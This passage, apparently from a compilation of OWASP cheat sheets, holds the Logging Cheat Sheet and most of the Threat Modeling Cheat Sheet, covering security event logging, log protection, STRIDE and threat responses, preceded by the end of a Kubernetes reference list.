10. 12 Kubernetes configuration best practices - <https://www.stackrox.com/post/2019/09/12-kubernetes-configuration-best-practices/#6-securely-configure-the-kubernetes-api-server>
11. A Practical Guide to Kubernetes Logging - <https://logz.io/blog/a-practical-guide-to-kubernetes-logging>
12. Kubernetes Web UI (Dashboard) - <https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard>
13. Tesla cloud resources are hacked to run cryptocurrency-mining malware - <https://arstechnica.com/information-technology/2018/02/tesla-cloud-resources-are-hacked-to-run-cryptocurrency-mining-malware>
14. OPEN POLICY AGENT: CLOUD-NATIVE AUTHORIZATION - <https://blog.styra.com/blog/open-policy-agent-authorization-for-the-cloud>
15. Introducing Policy As Code: The Open Policy Agent (OPA) - <https://www.magalix.com/blog/introducing-policy-as-code-the-open-policy-agent-opa>
16. What service mesh provides - <https://aspenmesh.io/wp-content/uploads/2019/10/AspenMesh_CompleteGuide.pdf>
17. Three Technical Benefits of Service Meshes and their Operational Limitations, Part 1 - <https://glasnostic.com/blog/service-mesh-istio-limits-and-benefits-part-1>
18. Open Policy Agent: What Is OPA and How It Works (Examples) - <https://spacelift.io/blog/what-is-open-policy-agent-and-how-it-works>
19. Send Kubernetes Metrics To Kibana and Elasticsearch - <https://logit.io/sources/configure/kubernetes/>
20. Kubernetes Security Checklist - <https://kubernetes.io/docs/concepts/security/security-checklist/>


---
# Logging_Cheat_Sheet.md

# Logging Cheat Sheet

## Introduction

This cheat sheet is focused on providing developers with concentrated guidance on building application logging mechanisms, especially related to security logging.

Many systems enable network device, operating system, web server, mail server and database server logging, but often custom application event logging is missing, disabled or poorly configured. It provides much greater insight than infrastructure logging alone. Web application (e.g. web site or web service) logging is much more than having web server logs enabled (e.g. using Extended Log File Format).

Application logging should be consistent within the application, consistent across an organization's application portfolio and use industry standards where relevant, so the logged event data can be consumed, correlated, analyzed and managed by a wide variety of systems.

## Purpose

Application logging should always be included for security events. Application logs are invaluable data for both security and operational use cases.

### Operational use cases

- General debugging
- Establishing baselines
- Business process monitoring e.g. sales process abandonment, transactions, connections
- Providing information about problems and unusual conditions
- Performance monitoring e.g. data load time, page timeouts
- Other business-specific requirements

### Security use cases

Application logging might also be used to record other types of events too such as:

- Anti-automation monitoring
- Identifying security incidents
- Monitoring policy violations
- Assisting non-repudiation controls (note that the trait non-repudiation is hard to achieve for logs because their trustworthiness is often just based on the logging party being audited properly while mechanisms like digital signatures are hard to utilize here)
- Audit trails e.g. data addition, modification and deletion, data exports
- Compliance monitoring
- Data for subsequent requests for information e.g. data subject access, freedom of information, litigation, police and other regulatory investigations
- Legally sanctioned interception of data e.g. application-layer wire-tapping
- Contributing additional application-specific data for incident investigation which is lacking in other log sources
- Helping defend against vulnerability identification and exploitation through attack detection

Process monitoring, audit, and transaction logs/trails etc. are usually collected for different purposes than security event logging, and this often means they should be kept separate.

The types of events and details collected will tend to be different.

For example a [PCIDSS](https://www.pcisecuritystandards.org/pci_security/) audit log will contain a chronological record of activities to provide an independently verifiable trail that permits reconstruction, review and examination to determine the original sequence of attributable transactions. It is important not to log too much, or too little.

Use knowledge of the intended purposes to guide what, when and how much. The remainder of this cheat sheet primarily discusses security event logging.

## Design, implementation, and testing

### Event data sources

The application itself has access to a wide range of information events that should be used to generate log entries. Thus, the primary event data source is the application code itself.

The application has the most information about the user (e.g. identity, roles, permissions) and the context of the event (target, action, outcomes), and often this data is not available to either infrastructure devices, or even closely-related applications.

Other sources of information about application usage that could also be considered are:

- Client software e.g. actions on desktop software and mobile devices in local logs or using messaging technologies, JavaScript exception handler via AJAX, web browser such as using Content Security Policy (CSP) reporting mechanism
- Embedded instrumentation code
- Network firewalls
- Network and host intrusion detection systems (NIDS and HIDS)
- Closely-related applications e.g. filters built into web server software, web server URL redirects/rewrites to scripted custom error pages and handlers
- Application firewalls e.g. filters, guards, XML gateways, database firewalls, web application firewalls (WAFs)
- Database applications e.g. automatic audit trails, trigger-based actions
- Reputation monitoring services e.g. uptime or malware monitoring
- Other applications e.g. fraud monitoring, CRM
- Operating system e.g. mobile platform

The degree of confidence in the event information has to be considered when including event data from systems in a different trust zone. Data may be missing, modified, forged, replayed and could be malicious – it must always be treated as untrusted data.

Consider how the source can be verified, and how integrity and non-repudiation can be enforced.

### Where to record event data

Applications commonly write event log data to the file system or a database (SQL or NoSQL). Applications installed on desktops and on mobile devices may use local storage and local databases, as well as sending data to remote storage.

Your selected framework may limit the available choices. All types of applications may send event data to remote systems (instead of or as well as more local storage).

This could be a centralized log collection and management system (e.g. SIEM or SEM) or another application elsewhere. Consider whether the application can simply send its event stream, unbuffered, to stdout, for management by the execution environment.

- When using the file system, it is preferable to use a separate partition than those used by the operating system, other application files and user generated content
    - For file-based logs, apply strict permissions concerning which users can access the directories, and the permissions of files within the directories
    - In web applications, the logs should not be exposed in web-accessible locations, and if done so, should have restricted access and be configured with a plain text MIME type (not HTML)
- When using a database, it is preferable to utilize a separate database account that is only used for writing log data and which has very restrictive database, table, function and command permissions
- Use standard formats over secure protocols to record and send event data, or log files, to other systems e.g. Common Log File System (CLFS) or Common Event Format (CEF) over syslog; standard formats facilitate integration with centralised logging services

Consider separate files/tables for extended event information such as error stack traces or a record of HTTP request and response headers and bodies.

### Which events to log

The level and content of security monitoring, alerting, and reporting needs to be set during the requirements and design stage of projects, and should be proportionate to the information security risks. This can then be used to define what should be logged.

There is no one size fits all solution, and a blind checklist approach can lead to unnecessary "alarm fog" that means real problems go undetected.

Where possible, always log:

- Input validation failures e.g. protocol violations, unacceptable encodings, invalid parameter names and values
    - A specific event for failures to validate a value against a discrete and finite list of valid values (e.g. a country from a dropdown). This is a high security event as it can only be attack activity. For example `input_validation_fail[:field,userid]`.
- Output validation failures e.g. database record set mismatch, invalid data encoding
- Authentication successes and failures
- Authorization (access control) failures
- Session management failures e.g. cookie session identification value modification or suspicious JWT validation failures
- Application errors and system events e.g. syntax and runtime errors, connectivity problems, performance issues, third party service error messages, file system errors, file upload virus detection, configuration changes
- Application and related systems start-ups and shut-downs, and logging initialization (starting, stopping or pausing)
- Use of higher-risk functionality including:
    - User administration actions such as addition or deletion of users, changes to privileges, assigning users to tokens, adding or deleting tokens
    - Use of systems administrative privileges or access by application administrators including all actions by those users
    - Use of default or shared accounts or a "break-glass" account.
    - Access to sensitive data such as payment cardholder data,
    - Encryption activities such as use or rotation of cryptographic keys
    - Creation and deletion of system-level objects
    - Data import and export including screen-based reports
    - Submission and processing of user-generated content - especially file uploads
    - Deserialization failures
    - Network connections and associated failures such as backend TLS failures (including certificate validation failures), or requests with an unexpected HTTP verb
- Legal and other opt-ins e.g. permissions for mobile phone capabilities, terms of use, terms & conditions, personal data usage consent, permission to receive marketing communications
- Suspicious business logic activities such as:
    - Attempts to perform a set actions out of order/bypass flow control
    - Actions which don't make sense in the business context
    - Attempts to exceed limitations for particular actions

Optionally consider if the following events can be logged and whether it is desirable information:

- Sequencing failure
- Excessive use
- Data changes
- Fraud and other criminal activities
- Suspicious, unacceptable, or unexpected behavior
- Modifications to configuration
- Application code file and/or memory changes

### Event attributes

Each log entry needs to include sufficient information for the intended subsequent monitoring and analysis. It could be full content data, but is more likely to be an extract or just summary properties.

The application logs must record "when, where, who and what" for each event.

The properties for these will be different depending on the architecture, class of application and host system/device, but often include the following:

- When
    - Log date and time (international format)
    - Event date and time - the event timestamp may be different to the time of logging e.g. server logging where the client application is hosted on remote device that is only periodically or intermittently online
    - Interaction identifier `Note A`
- Where
    - Application identifier e.g. name and version
    - Application address e.g. cluster/hostname or server IPv4 or IPv6 address and port number, workstation identity, local device identifier
    - Service e.g. name and protocol
    - Geolocation
    - Window/form/page e.g. entry point URL and HTTP method for a web application, dialogue box name
    - Code location e.g. script name, module name
- Who (human or machine user)
    - Source address e.g. user's device/machine identifier, user's IP address, cell/RF tower ID, mobile telephone number
    - User identity (if authenticated or otherwise known) e.g. user database table primary key-value, username, license number
- What
    - Type of event `Note B`
    - Severity of event `Note B` e.g. `{0=emergency, 1=alert, ..., 7=debug}, {fatal, error, warning, info, debug, trace}`
    - Security relevant event flag (if the logs contain non-security event data too)
    - Description

Additionally consider recording:

- Secondary time source (e.g. GPS) event date and time
- Action - original intended purpose of the request e.g. Log in, Refresh session ID, Log out, Update profile
- Object e.g. the affected component or other object (user account, data resource, file) e.g. URL, Session ID, User account, File
- Result status - whether the ACTION aimed at the OBJECT was successful e.g. Success, Fail, Defer
- Reason - why the status above occurred e.g. User not authenticated in database check ..., Incorrect credentials
- HTTP Status Code (web applications only) - the status code returned to the user (often 200 or 301)
- Request HTTP headers or HTTP User Agent (web applications only)
- User type classification e.g. public, authenticated user, CMS user, search engine, authorized penetration tester, uptime monitor (see "Data to exclude" below)
- Analytical confidence in the event detection `Note B` e.g. low, medium, high or a numeric value
- Responses seen by the user and/or taken by the application e.g. status code, custom text messages, session termination, administrator alerts
- Extended details e.g. stack trace, system error messages, debug information, HTTP request body, HTTP response headers and body
- Internal classifications e.g. responsibility, compliance references
- External classifications e.g. NIST Security Content Automation Protocol (SCAP), Mitre Common Attack Pattern Enumeration and Classification (CAPEC)

For more information on these, see the "other" related articles listed at the end, especially the comprehensive article by Anton Chuvakin and Gunnar Peterson.

**Note A:** The "Interaction identifier" is a method of linking all (relevant) events for a single user interaction (e.g. desktop application form submission, web page request, mobile app button click, web service call). The application knows all these events relate to the same interaction, and this should be recorded instead of losing the information and forcing subsequent correlation techniques to re-construct the separate events. For example, a single SOAP request may have multiple input validation failures and they may span a small range of times. As another example, an output validation failure may occur much later than the input submission for a long-running "saga request" submitted by the application to a database server.

**Note B:** Each organisation should ensure it has a consistent, and documented, approach to classification of events (type, confidence, severity), the syntax of descriptions, and field lengths and data types including the format used for dates/times.

### Data to exclude

Never log data unless it is legally sanctioned. For example, intercepting some communications, monitoring employees, and collecting some data without consent may all be illegal.

Never exclude any events from "known" users such as other internal systems, "trusted" third parties, search engine robots, uptime/process and other remote monitoring systems, pen testers, auditors. However, you may want to include a classification flag for each of these in the recorded data.

The following should usually not be recorded directly in the logs, but instead should be removed, masked, sanitized, hashed, or encrypted:

- Application source code
- Session identification values (consider replacing with a hashed value if needed to track session specific events)
- Access tokens
- Sensitive personal data and some forms of personally identifiable information (PII) e.g. health, government identifiers, vulnerable people
- Authentication passwords
- Database connection strings
- Encryption keys and other primary secrets
- Bank account or payment card holder data
- Data of a higher security classification than the logging system is allowed to store
- Commercially-sensitive information
- Information it is illegal to collect in the relevant jurisdictions
- Information a user has opted out of collection, or not consented to e.g. use of do not track, or where consent to collect has expired

Sometimes the following data can also exist, and whilst useful for subsequent investigation, it may also need to be treated in some special manner before the event is recorded:

- File paths
- Database connection strings
- Internal network names and addresses
- Non sensitive personal data (e.g. personal names, telephone numbers, email addresses)

Consider using personal data de-identification techniques such as deletion, scrambling or pseudonymization of direct and indirect identifiers where the individual's identity is not required, or the risk is considered too great.

In some systems, sanitization can be undertaken post log collection, and prior to log display.

### Customizable logging

It may be desirable to be able to alter the level of logging (type of events based on severity or threat level, amount of detail recorded). If this is implemented, ensure that:

- The default level must provide sufficient detail for business needs
- It should not be possible to completely deactivate application logging or logging of events that are necessary for compliance requirements
- Alterations to the level/extent of logging must be intrinsic to the application (e.g. undertaken automatically by the application based on an approved algorithm) or follow change management processes (e.g. changes to configuration data, modification of source code)
- The logging level must be verified periodically

### Event collection

If your development framework supports suitable logging mechanisms, use or build upon that. Otherwise, implement an application-wide log handler which can be called from other modules/components.

Document the interface referencing the organisation-specific event classification and description syntax requirements.

If possible create this log handler as a standard module that can be thoroughly tested, deployed in multiple applications, and added to a list of approved and recommended modules.

- Perform input validation on event data from other trust zones to ensure it is in the correct format (and consider alerting and not logging if there is an input validation failure)
- Perform sanitization on all event data to prevent log injection attacks e.g. carriage return (CR), line feed (LF) and delimiter characters (and optionally to remove sensitive data)
- Encode data correctly for the output (logged) format
- If writing to databases, read, understand, and apply the SQL injection cheat sheet
- Ensure failures in the logging processes/systems do not prevent the application from otherwise running or allow information leakage
- Synchronize time across all servers and devices `Note C`

**Note C:** This is not always possible where the application is running on a device under some other party's control (e.g. on an individual's mobile phone, on a remote customer's workstation which is on another corporate network). In these cases, attempt to measure the time offset, or record a confidence level in the event timestamp.

Where possible, record data in a standard format, or at least ensure it can be exported/broadcast using an industry-standard format.

In some cases, events may be relayed or collected together in intermediate points. In the latter some data may be aggregated or summarized before forwarding on to a central repository and analysis system.

### Verification

Logging functionality and systems must be included in code review, application testing and security verification processes:

- Ensure the logging is working correctly and as specified
- Check that events are being classified consistently and the field names, types and lengths are correctly defined to an agreed standard
- Ensure logging is implemented and enabled during application security, fuzz, penetration, and performance testing
- Test the mechanisms are not susceptible to injection attacks
- Ensure there are no unwanted side-effects when logging occurs
- Check the effect on the logging mechanisms when external network connectivity is lost (if this is usually required)
- Ensure logging cannot be used to deplete system resources, for example by filling up disk space or exceeding database transaction log space, leading to denial of service
- Test the effect on the application of logging failures such as simulated database connectivity loss, lack of file system space, missing write permissions to the file system, and runtime errors in the logging module itself
- Verify access controls on the event log data
- If log data is utilized in any action against users (e.g. blocking access, account lock-out), ensure this cannot be used to cause denial of service (DoS) of other users

### Network architecture

As an example, the diagram below shows a service that provides business functionality to customers. We recommend creating a centralized system for collecting logs. There may be many such services, but all of them must securely collect logs in a centralized system.

Applications of this business service are located in network segments:

- FRONTEND 1 aka DMZ (UI)
- MIDDLEWARE 1 (business application - service core)
- BACKEND 1 (service database)

The service responsible for collecting IT events, including security events, is located in the following segments:

- BACKEND 2 (log storage)
- MIDDLEWARE 3 - 2 applications:
    - log loader application that download log from storage, pre-processes, and transfer to UI
    - log collector that accepts logs from business applications, other infrastructure, cloud applications and saves in log storage
- FRONTEND 2 (UI for viewing business service event logs)
- FRONTEND 3 (applications that receive logs from cloud applications and transfer logs to log collector)
    - It is allowed to combine the functionality of two applications in one

For example, all external requests from users go through the API management service, see application in MIDDLEWARE 2 segment.

![MIDDLEWARE](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/Logging_Cheat_Sheet.drawio.png)

As you can see in the image above, at the network level, the processes of saving and downloading logs require opening different network accesses (ports), arrows are highlighted in different colors. Also, saving and downloading are performed by different applications.

Full network segmentation cheat sheet by [sergiomarotco](https://github.com/sergiomarotco): [link](https://github.com/sergiomarotco/Network-segmentation-cheat-sheet)

## Deployment and operation

### Release

- Provide security configuration information by adding details about the logging mechanisms to release documentation
- Brief the application/process owner about the application logging mechanisms
- Ensure the outputs of the monitoring (see below) are integrated with incident response processes

### Operation

Enable processes to detect whether logging has stopped, and to identify tampering or unauthorized access and deletion (see protection below).

### Protection

The logging mechanisms and collected event data must be protected from mis-use such as tampering in transit, and unauthorized access, modification and deletion once stored. Logs may contain personal and other sensitive information, or the data may contain information regarding the application's code and logic.

In addition, the collected information in the logs may itself have business value (to competitors, gossip-mongers, journalists and activists) such as allowing the estimate of revenues, or providing performance information about employees.

This data may be held on end devices, at intermediate points, in centralized repositories and in archives and backups.

Consider whether parts of the data may need to be excluded, masked, sanitized, hashed, or encrypted during examination or extraction.

At rest:

- Build in tamper detection so you know if a record has been modified or deleted
- Store or copy log data to read-only media as soon as possible
- All access to the logs must be recorded and monitored (and may need prior approval)
- The privileges to read log data should be restricted and reviewed periodically

In transit:

- If log data is sent over untrusted networks (e.g. for collection, for dispatch elsewhere, for analysis, for reporting), use a secure transmission protocol
- Consider whether the origin of the event data needs to be verified
- Perform due diligence checks (regulatory and security) before sending event data to third parties

See `NIST SP 800-92` Guide to Computer Security Log Management for more guidance.

### Monitoring of events

The logged event data needs to be available to review and there are processes in place for appropriate monitoring, alerting, and reporting:

- Incorporate the application logging into any existing log management systems/infrastructure e.g. centralized logging and analysis systems
- Ensure event information is available to appropriate teams
- Enable alerting and signal the responsible teams about more serious events immediately
- Share relevant event information with other detection systems, to related organizations and centralized intelligence gathering/sharing systems

### Disposal of logs

Log data, temporary debug logs, and backups/copies/extractions, must not be destroyed before the duration of the required data retention period, and must not be kept beyond this time.

Legal, regulatory and contractual obligations may impact on these periods.

## Attacks on Logs

Because of their usefulness as a defense, logs may be a target of attacks. See also OWASP [Log Injection](https://owasp.org/www-community/attacks/Log_Injection) and [CWE-117](https://cwe.mitre.org/data/definitions/117.html).

### Confidentiality

Who should be able to read what? A confidentiality attack enables an unauthorized party to access sensitive information stored in logs.

- Logs contain PII of users. Attackers gather PII, then either release it or use it as a stepping stone for further attacks on those users.
- Logs contain technical secrets such as passwords. Attackers use it as a stepping stone for deeper attacks.

### Integrity

Which information should be modifiable by whom?

- An attacker with read access to a log uses it to exfiltrate secrets.
- An attack leverages logs to connect with exploitable facets of logging platforms, such as sending in a payload over syslog in order to cause an out-of-bounds write.

### Availability

What downtime is acceptable?

- An attacker floods log files in order to exhaust disk space available for non-logging facets of system functioning. For example, the same disk used for log files might be used for SQL storage of application data.
- An attacker floods log files in order to exhaust disk space available for further logging.
- An attacker uses one log entry to destroy other log entries.
- An attacker leverages poor performance of logging code to reduce application performance

### Accountability

Who is responsible for harm?

- An attacker prevent writes in order to cover their tracks.
- An attacker prevent damages the log in order to cover their tracks.
- An attacker causes the wrong identity to be logged in order to conceal the responsible party.

## Related articles

- OWASP [ESAPI Documentation](https://owasp.org/www-project-enterprise-security-api/).
- OWASP [Logging Project](https://owasp.org/www-project-security-logging/).
- IETF [syslog protocol](https://tools.ietf.org/rfc/rfc5424.txt).
- Mitre [Common Event Expression (CEE)](https://cee.mitre.org/) (as of 2014 no longer actively developed).
- NIST [SP 800-92 Guide to Computer Security Log Management](https://csrc.nist.gov/publications/nistpubs/800-92/SP800-92.pdf).
- PCISSC [PCI DSS v2.0 Requirement 10 and PA-DSS v2.0 Requirement 4](https://www.pcisecuritystandards.org/security_standards/documents.php).
- W3C [Extended Log File Format](https://www.w3.org/TR/WD-logfile.html).
- Other [Build Visibility In, Richard Bejtlich, TaoSecurity blog](https://taosecurity.blogspot.co.uk/2009/08/build-visibility-in.html).
- Other [Common Event Format (CEF), Arcsight](https://community.microfocus.com/t5/ArcSight-Connectors/ArcSight-Common-Event-Format-CEF-Implementation-Standard/ta-p/1645557).
- Other [Log Event Extended Format (**LEEF**), IBM](https://www.ibm.com/developerworks/community/wikis/form/anonymous/api/wiki/9989d3d7-02c1-444e-92be-576b33d2f2be/page/3dc63f46-4a33-4e0b-98bf-4e55b74e556b/attachment/a19b9122-5940-4c89-ba3e-4b4fc25e2328/media/QRadar_LEEF_Format_Guide.pdf).
- Other [Common Log File System (CLFS), Microsoft](https://msdn.microsoft.com/en-us/library/windows/desktop/bb986747(v=vs.85).aspx).
- Other [Building Secure Applications: Consistent Logging, Rohit Sethi & Nish Bhalla, Symantec Connect](https://www.symantec.com/connect/articles/building-secure-applications-consistent-logging).


---
# Threat_Modeling_Cheat_Sheet.md

# Threat Modeling Cheat Sheet

## Introduction

Threat modeling is an important concept for modern application developers to understand. The goal of this cheatsheet is to provide a concise, but actionable, reference for both those new to threat modeling and those seeking a refresher.
The OWASP [Threat Modeling project](https://owasp.org/www-project-threat-modeling/) provides further information on various aspects of threat modeling.

## Overview

In the context of application security, threat modeling is a structured, repeatable process used to gain actionable insights into the security characteristics of a particular system. It involves modeling a system from a security perspective, identifying applicable threats based on this model, and determining responses to these threats. Threat modeling analyzes a system from an adversarial perspective, focusing on ways in which an attacker can exploit a system.

Threat modeling is ideally performed early in the SDLC, such as during the design phase. Moreover, it is not something that is performed once and never again. A threat model is something that should be maintained, updated and refined alongside the system. Ideally, threat modeling should be integrated seamlessly into a team's normal SDLC process; it should be treated as standard and necessary step in the process, not an add-on.

According to the [Threat Modeling Manifesto](https://www.threatmodelingmanifesto.org/), the threat modeling process should answer the following four questions:

1. What are we working on?
2. What can go wrong?
3. What are we going to do about it?
4. Did we do a good enough job?

These four questions will act as the foundation for the four major phases described below.

## Advantages

Before turning to an overview of the process, it may be worth addressing the question: why threat model? Why bother adding more work to the development process? What are the benefits? The following section will briefly outline some answers to these questions.

### Identify Risks Early On

Threat modeling seeks to identify potential security issues during the design phase. This allows security to be "built-into" a system rather than "bolted-on". This is far more efficient than having to identify and resolve security flaws after a system is in production.

### Increased Security Awareness

Proper threat modeling requires participants to think creatively and critically about the security and threat landscape of a specific application. It challenges individuals to "think like an attacker" and apply general security knowledge to a specific context. Threat modeling is also typically a team effort with members being encouraged to share ideas and provide feedback on others. Overall, threat modeling can prove to be a highly educational activity that benefits participants.

### Improved Visibility of Target of Evaluation (TOE)

Threat modeling requires a deep understanding of the system being evaluated. To properly threat model, one must understand data flows, trust boundaries, and other characteristics of the system. Thus improved visibility into a system and its interactions is one advantage of threat modeling.

## Addressing Each Question

There is no universally accepted industry standard for the threat modeling process, no "right" answer for every use case. However, despite this diversity, most approaches do include the processes of system modeling, threat identification, and risk response in some form. Inspired by these commonalities and guided by the four key questions of threat modeling discussed above, this cheatsheet will break the threat modeling down into four basic steps: application decomposition, threat identification and ranking, mitigations, and review and validation. There are processes that are less aligned to this, including PASTA and OCTAVE, each of which has passionate advocates.

### System Modeling

The step of system modeling seeks to answer the question "what are we building"? Without understanding a system, one cannot truly understand what threats are most applicable to it; thus, this step provides a critical foundation for subsequent activities. Although different techniques may be used in this first step of threat modeling, data flow diagrams (DFDs) are arguably the most common approach.

DFDs allow one to visually model a system and its interactions with data and other entities; they are created using a [small number of simple symbols](https://github.com/adamshostack/DFD3). DFDs may be created within dedicated threat modeling tools such as [OWASP's Threat Dragon](https://github.com/OWASP/threat-dragon) or [Microsoft's Threat Modeling Tool](https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool) or using general purpose diagraming solutions such as [draw.io](https://draw.io). If you prefer an -as-code approach, [OWASP's pytm](https://owasp.org/www-project-pytm/) can help there. Depending on the scale and complexity of the system being modeled, multiple DFDs may be required. For example, one could create a DFD representing a high-level overview of the entire system along with a number of more focused DFDs which detail sub-systems. Technical tools are not strictly necessary; whiteboarding may be sufficient in some instances, though it is preferable to have the DFDs in a form that can be easily stored, referenced, and updated as needed.

Regardless of how a DFD or comparable model is generated, it is important that the solution provides a clear view of trust boundaries, data flows, data stores, processes, and the external entities which may interact with the system. These often represent possible attack points and provide crucial input for the subsequent steps.

Another approach to Data Flow Diagrams (DFD) could be the brainstorming technique, which is an effective method for generating ideas and discovering the project's domain. Applying brainstorming in this context can bring numerous benefits, such as increased team engagement, unification of knowledge and terminology, a shared understanding of the domain, and quick identification of key processes and dependencies. One of the main arguments for using brainstorming is its flexibility and adaptability to almost any scenario, including business logic. Additionally, this technique is particularly useful when less technical individuals participate in the session, as it eliminates barriers related to understanding and applying the components of DFD models and their correctness.

Brainstorming engages all participants, fostering better communication and mutual understanding of issues. Every team member has the opportunity to contribute, which increases the sense of responsibility and involvement. During a brainstorming session, participants can collaboratively define and agree on key terms and concepts, leading to a unified language used in the project. This is especially important in complex projects where different teams might have different approaches to terminology. Due to the dynamic nature of brainstorming, the team can quickly identify key business processes and their interrelations.

Integrating the results of brainstorming with formal modeling techniques can lead to a better understanding of the domain and more effective system design.

### Cloud Threat Modeling

Most modern systems are cloud-native or hybrid. Traditional threat modeling techniques (like STRIDE or DFDs) often need adaptation for cloud architectures, which introduce:

- Shared responsibility models
- Managed services and APIs
- Multi-tenant and identity federation considerations
- Dynamic infrastructure (IaC, serverless, containers)

Cloud-native systems introduce unique considerations for threat modeling due to their distributed, service-oriented nature and shared responsibility model. In this context, the threat modeling process should account for:

- **Cloud architecture components:** virtual networks, IAM roles, managed services, and storage buckets.
- **Shared responsibility:** understanding which security controls are managed by the provider vs. the customer.
- **Dynamic environments:** container orchestration, serverless functions, and ephemeral infrastructure.
- **Compliance and data residency:** ensuring that workloads meet jurisdictional and privacy requirements.

Cloud threat modeling frameworks such as AWS’s [Well-Architected Framework – Security Pillar](https://docs.aws.amazon.com/wellarchitected/latest/security-pillar/welcome.html) can serve as references.

### Threat Identification

After the system has been modeled, it is now time to address the question of "what can go wrong?". This question must be explored with the inputs from the first step in mind; that is, it should focus on identifying and ranking threats within the context of the specific system being evaluated. In attempting to answer this question, threat modelers have a wealth of data sources and techniques at their disposal. For illustration purposes, this cheatsheet will leverage STRIDE; however, in practice, other approaches may be used alongside or instead of STRIDE.

STRIDE is a mature and popular threat modeling technique and mnemonic originally developed by Microsoft employees. To facilitate threat identification, STRIDE groups threats into one of six general prompts and engineers are encouraged to systematically consider how these general threats may materialize within the context of the specific system being evaluated. Each STRIDE threat may be considered a violation of a desirable security attribute; the categories and associated desirable attributes are are as follows:

| Threat Category             | Violates          | Examples                                                                                                    |
| --------------------------- | ----------------- | ----------------------------------------------------------------------------------------------------------- |
| **S**poofing                | Authentication    | An attacker steals the authentication token of a legitimate user and uses it to impersonate the user.       |
| **T**ampering               | Integrity         | An attacker abuses the application to perform unintended updates to a database.                             |
| **R**epudiation             | Accounting        | An attacker manipulates logs to cover their actions.                                                        |
| **I**nformation Disclosure  | Confidentiality   | An attacker extracts data from a database containing user account info.                                     |
| **D**enial of Service       | Availability      | An attacker locks a legitimate user out of their account by performing many failed authentication attempts. |
| **E**levation of Privileges | Authorization     | An attacker tampers with a JWT to change their role.                                                        |

STRIDE provides valuable structure for responding to the question of "what can go wrong". It is also a highly flexible approach and getting started need not be complex. Simple techniques such as brainstorming and whiteboarding or even [games](https://github.com/adamshostack/eop/) may be used initially. STRIDE is also incorporated into popular threat modeling tools such as [OWASP's Threat Dragon](https://github.com/OWASP/threat-dragon) and [Microsoft's Threat Modeling Tool](https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool). Additionally, as a relatively high-level process, STRIDE pairs well with more tactical approaches such as kill chains or [MITRE's ATT&CK](https://attack.mitre.org/) (please refer to [this article](https://web.isc2ncrchapter.org/under-attck-how-mitres-methodology-to-find-threats-and-embed-counter-measures-might-work-in-your-organization/) for an overview of how STRIDE and ATT&CK can work together).

After possible threats have been identified, people will frequently rank them. In theory, ranking should be based on the mathematical product of an identified threat's likelihood and its impact. A threat that is likely to occur and result in serious damage would be prioritized much higher than one that is unlikely to occur and would only have a moderate impact. However, these both can be challenging to calculate, and they ignore the work to fix a problem. Some advocate for including that in a single prioritization.

### Response and Mitigations

Equipped with an understanding of both the system and applicable threats, it is now time to answer "what are we going to do about it"?. Each threat identified earlier must have a response. Threat responses are similar, but not identical, to risk responses. [Adam Shostack](https://shostack.org/resources/threat-modeling) lists the following responses:

- **Mitigate:** Take action to reduce the likelihood that the threat will materialize.
- **Eliminate:** Simply remove the feature or component that is causing the threat.
- **Transfer:** Shift responsibility to another entity such as the customer.
- **Accept:** Do not mitigate, eliminate, or transfer the risk because none of the above options are acceptable given business requirements or constraints.

If one decides to mitigate a threat, mitigation strategies must be formulated and documented as requirements. Depending on the complexity of the system, nature of threats identified, and the process used for identifying threats (STRIDE or another method), mitigation responses may be applied at either the category or individual threat level. In the former case, the mitigation would apply to all threats within that category. Mitigation strategies must be actionable not hypothetical; they must be something that can actually be built into to the system being developed. Although mitigation strategies must be tailored to the particular application, resources such as as [OWASP's ASVS](https://owasp.org/www-project-application-security-verification-standard/) and [MITRE's CWE list](https://cwe.mitre.org/index.html) can prove valuable when formulating these responses.

### Review and Validation

Finally, it is time to answer the question "did we do a good enough job"? The threat model must be reviewed by all stakeholders, not just the development or security teams. Areas to focus on include:

- Does the DFD (or comparable) accurately reflect the system?
- Have all threats been identified?
- For each identified threat, has a response strategy been agreed upon?
- For identified threats for which mitigation is the desired response, have mitigation strategies been developed which reduce risk to an acceptable level?
- Has the threat model been formally documented? Are artifacts from the threat model process stored in such a way that it can be accessed by those with "need to know"?
- Can the agreed upon mitigations be tested? Can success or failure of the requirements and recommendations from the threat model be measured?

## Threat Modeling and the Development Team

### Challenges

Threat modeling can be challenging for development teams for several key reasons. Firstly, many developers lack sufficient knowledge and experience in the field of security, which hinders their ability to effectively use methodologies and frameworks, identify, and model threats. Without proper training and understanding of basic security principles, developers may overlook potential threats or incorrectly assess their risks.

Additionally, the threat modeling process can be complex and time-consuming. It requires a systematic approach and in-depth analysis, which is often difficult to reconcile with tight schedules and the pressure to deliver new functionalities. Development teams may feel a lack of tools and resources to support them in this task, leading to frustration and discouragement.

Another challenge is the communication and collaboration between different departments within the organization. Without effective communication between development teams, security teams, and other stakeholders, threat modeling can be incomplete or misdirected.

### Addressing the Challenges

In many cases, the solution lies in inviting members of the security teams to threat modeling sessions, which can significantly improve the process. Security specialists bring essential knowledge about potential threats that is crucial for effective identification, risk analysis, and mitigation. Their experience and understanding of the latest trends and techniques used by cybercriminals can provide key insights for learning and developing the competencies of development teams. Such joint sessions not only enhance developers' knowledge but also build a culture of collaboration and mutual support within the organization, leading to a more comprehensive approach to security.

To change the current situation, organizations should invest in regular IT security training for their development teams. These training sessions should be conducted by experts and tailored to the specific needs of the team. Additionally, it is beneficial to implement processes and tools that simplify and automate threat modeling. These tools can help in identifying and assessing threats, making the process more accessible and less time-consuming.

It is also important to promote a culture of security throughout the organization, where threat modeling is seen as an integral part of the Software Development Life Cycle (SDLC), rather than an additional burden. Regular review sessions and cross-team workshops can improve collaboration and communication, leading to a more effective and comprehensive approach to security. Through these actions, organizations can make threat modeling a less burdensome and more efficient process, bringing real benefits to the security of their systems.

## References

### Methods and Techniques

An alphabetical list of techniques:

- [LINDDUN](https://linddun.org/)
- [PASTA](https://cdn2.hubspot.net/hubfs/4598121/Content%20PDFs/VerSprite-PASTA-Threat-Modeling-Process-for-Attack-Simulation-Threat-Analysis.pdf)
- [STRIDE](<https://learn.microsoft.com/en-us/previous-versions/commerce-server/ee823878(v=cs.20)?redirectedfrom=MSDN>)
- [OCTAVE](https://insights.sei.cmu.edu/library/introduction-to-the-octave-approach/)
- [VAST](https://go.threatmodeler.com/vast-methodology-data-sheet)

### Tools

